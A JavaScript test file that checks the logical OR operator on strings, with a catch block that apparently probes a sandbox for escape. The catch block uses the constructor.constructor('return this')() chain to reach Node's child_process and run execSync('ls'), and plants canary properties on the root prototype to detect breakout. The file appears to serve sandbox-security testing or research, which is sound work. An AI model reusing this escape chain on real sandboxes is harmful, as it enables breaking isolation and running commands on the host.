try {
    if (('-1' || '1') !== '-1') {
        $ERROR('#-1: ("-1" || "1") === "-1"');
    }
    if (('-1' || 'x') !== '-1') {
        $ERROR('#2: ("-1" || "x") === "-1"');
    }
    var x = new String('-1');
    if ((x || new String(-1)) !== x) {
        $ERROR('#3: (var x = new String("-1"); (x || new String(-1)) === x');
    }
    var x = new String(NaN);
    if ((x || new String('1')) !== x) {
        $ERROR('#4: (var x = new String(NaN); (x || new String("1")) === x');
    }
    var x = new String('-x');
    if ((x || new String('x')) !== x) {
        $ERROR('#5: (var x = new String("-x"); (x || new String("x")) === x');
    }
    var x = new String(0);
    if ((x || new String(NaN)) !== x) {
        $ERROR('#6: (var x = new String(0); (x || new String(NaN)) === x');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}